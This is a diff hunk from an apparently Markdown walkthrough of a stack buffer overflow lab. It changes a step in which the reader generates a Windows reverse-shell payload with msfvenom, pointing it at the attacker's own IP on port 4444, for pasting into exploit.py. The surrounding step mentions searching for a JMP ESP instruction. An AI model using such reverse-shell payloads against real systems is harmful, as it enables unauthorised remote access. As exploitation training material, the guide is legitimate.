@@ -83,7 +83,7 @@ This is to find any `JMP ESP` that do not have the bad characters indicated.
 12. Generate a metersploit payload, using Kali IP and include bad characters, in the command below: 
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
 ```
 
 Copy the payload and paste it under the payload in `exploit.py`.
